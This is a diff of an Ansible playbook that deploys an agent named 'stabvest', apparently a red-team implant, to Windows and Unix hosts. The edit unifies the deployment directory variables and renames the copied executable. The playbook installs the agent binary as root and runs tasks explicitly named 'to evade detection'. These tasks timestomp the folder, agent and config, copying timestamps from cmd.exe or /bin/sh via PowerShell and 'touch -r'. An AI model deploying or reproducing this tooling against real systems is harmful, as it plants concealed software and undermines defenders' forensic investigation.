@@ -1,13 +1,13 @@
 ---
 - name: Ensure destination directory exists
   ansible.windows.win_file:
-    path: "{{ stabvest_deploy_dir_win }}"
+    path: "{{ stabvest_deploy_dir }}"
     state: directory
   when: ansible_facts.os_family == "Windows" 
 
 - name: Ensure destination directory exists
   ansible.builtin.file:
-    path: "{{ stabvest_deploy_dir_unix }}"
+    path: "{{ stabvest_deploy_dir }}"
     state: directory
     owner: root
     group: root
@@ -17,25 +17,18 @@
 - name: Copy agent executable to target
   win_copy:
     src: "files/{{ stabvest_agent_executable }}"
-    dest: "{{ stabvest_deploy_dir_win }}\\agent.exe"
+    dest: "{{ stabvest_deploy_dir }}\\{{ stabvest_agent_executable }}"
   when: ansible_facts.os_family == "Windows" 
 
 - name: Render config.json from template
   template:
     src: "config.json.j2"
-    dest: "{{ stabvest_deploy_dir_win }}\\config.json"
-  when: ansible_facts.os_family == "Windows" 
-
-- name: Render config.json from template
-  template:
-    src: "config.json.j2"
-    dest: "{{ stabvest_deploy_dir_unix }}/config.json"
-  when: ansible_facts.os_family != "Windows" 
+    dest: "{{ [stabvest_deploy_dir, 'config.json'] | path_join }}"
 
 - name: Copy agent executable to target
   copy:
     src: "files/{{ stabvest_agent_executable }}"
-    dest: "{{ stabvest_deploy_dir_unix }}/agent.bin"
+    dest: "{{ stabvest_deploy_dir }}/{{ stabvest_agent_executable }}"
     owner: root
     group: root
     mode: '0755'
@@ -44,9 +37,9 @@
 - name: Timestomp folder to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "{{ stabvest_deploy_dir_win }}").CreationTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}").LastWriteTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}").LastAccessTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}").LastAccessTime = $time
   args:
     executable: "powershell.exe"
   when: ansible_facts.os_family == "Windows" 
@@ -54,9 +47,9 @@
 - name: Timestomp agent to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").CreationTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").LastWriteTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").LastAccessTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\{{ stabvest_agent_executable }}").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\{{ stabvest_agent_executable }}").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\{{ stabvest_agent_executable }}").LastAccessTime = $time
   args:
     executable: "powershell.exe"
   when: ansible_facts.os_family == "Windows" 
@@ -64,21 +57,21 @@
 - name: Timestomp config to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").CreationTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").LastWriteTime = $time
-    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").LastAccessTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\config.json").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\config.json").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir }}\\config.json").LastAccessTime = $time
   args:
     executable: "powershell.exe"
   when: ansible_facts.os_family == "Windows" 
 
 - name: Timestomp the folder
-  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}
+  command: touch -r /bin/sh {{ stabvest_deploy_dir }}
   when: ansible_facts.os_family != "Windows"
 
 - name: Timestomp the agent
-  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}/agent.bin
+  command: touch -r /bin/sh {{ stabvest_deploy_dir }}/{{ stabvest_agent_executable }}
   when: ansible_facts.os_family != "Windows"
 
 - name: Timestomp the config
-  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}/config.json
+  command: touch -r /bin/sh {{ stabvest_deploy_dir }}/config.json
   when: ansible_facts.os_family != "Windows"
